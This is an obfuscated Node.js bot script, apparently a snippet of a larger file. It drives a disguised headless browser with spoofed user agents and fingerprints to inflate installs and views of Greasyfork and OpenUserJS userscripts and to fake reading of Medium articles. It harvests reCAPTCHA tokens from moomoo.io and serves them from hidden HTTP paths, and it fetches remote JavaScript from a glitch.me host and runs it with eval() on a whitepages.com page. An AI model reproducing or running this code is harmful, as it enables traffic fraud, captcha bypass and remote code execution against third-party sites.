      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0x6) + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + U(0x1c) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0xe) + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x9) + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + W(0xb) + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + W(0x19) + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + U(0x7) + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + V(0xc, 'AjBC')
  ],
  g = {
    'getToken': () => 0x157c + -0x1f21 + 0x1 * 0x9a5
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const X = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0xa23 * -0x3 + -0xb33 + -0x1336)[X(0x17, '9$8F') + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const Y = d;
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': Y(0x15)
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x11 * -0x1b + 0x489 * 0x5 + 0xa3f * -0x2), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xa5 * 0x23 + -0x1f81 + -0x2 * -0x1b3a), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x11b * 0x4 + 0x6d9 * -0x5 + 0x26a9;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0xf0 * -0x27 + -0x1e83 + 0x619 * 0xb; w < getRandomInt(0x1621 * 0x1 + 0x1ed9 * -0x1 + 0x1d * 0x4d, -0x12f7 + -0x912 * -0x1 + 0x1b * 0x5e); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xaaf3 * -0x2 + -0x8141 + 0x15bb);
        }
      }();
    }, 0x2 * 0x956 + -0x6 * -0x2a5 + -0x2226), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Z = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x2652 + 0x83 * 0x2b + 0x1051;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v[Z(0x11)](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1e5 * 0xd + -0x233c + -0x1 * -0x3bdd, -0x1 * -0x1e0b + -0x241c + -0xe5 * -0x7)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x479c + 0x6e * -0xcd + 0x114e2);
    }, -0x2 * -0x6ff + 0x19cb + -0x2765), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1 * 0x18e3 + 0x9f * -0x10 + -0xef3;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0xb72 * 0x1 + -0x8f2 * -0x4 + -0xc9e), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1 * 0x22de + -0x29a + 0x2578), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1 * 0x162061 + -0x10a05a + 0x347c5b);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x49 * -0x11 + -0x13 * 0x2 + -0x44f);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x186d + 0x10 * 0x208 + -0x3825);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x3979 * 0x1 + -0x144b * -0x1 + -0x2e34 * 0x1);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = d,
    a4 = c,
    a3 = b;
  async function f() {
    const a2 = c,
      a1 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x5e * -0x3 + 0x1118 + -0x1 * 0xffd) {
        const a0 = d;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf'](a0(0x14)) + 'Firefox' ['length'] + (0x21be + 0x26cf * 0x1 + -0x488c));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x202d + 0xd6 * 0xd + -0x3 * 0xe59, D['indexOf']('\x20'));
        return B ? E['slice'](-0x3 * -0xa45 + -0xc9a * -0x2 + -0x3803, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x2e46 + 0x145e * 0x2 + -0x2ff2),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x39a2 + 0xbad + -0x1e3f),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': a1(0x15)
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': a2(0x1d)
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + a3(0x4, '7FiP') + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + a4(0x18) + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + a5(0xa) + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x224 * 0x2 + -0x368 + 0x7b0; k < 0x1 * 0x23e6 + 0x17c9 + 0x1 * -0x3bab; k++)
    setTimeout(f, (0x5d * -0x83 + -0xfbe + 0x129b5) * k * getRandomInt(0x471 * 0x1 + 0x6c9 + -0x11 * 0xa9, 0x30e + 0x3f1 * 0x5 + -0x16c0));
  setInterval(() => {
    f();
    for (let l = 0xaa * 0x37 + -0x139 * -0x1 + 0x3 * -0xc95; l < -0xf05 + -0xd1e * 0x1 + 0x1c27; l++)
      setTimeout(f, (-0x63bb + 0x1f4b * 0x1 + 0x12ed0) * l * getRandomInt(-0xb3c * 0x1 + -0xa4c + 0x1589, 0x11a5 * -0x2 + -0x8f3 + 0x2c40));
  }, -0x2977a5 + -0x5b * -0x4322 + 0x48890f);
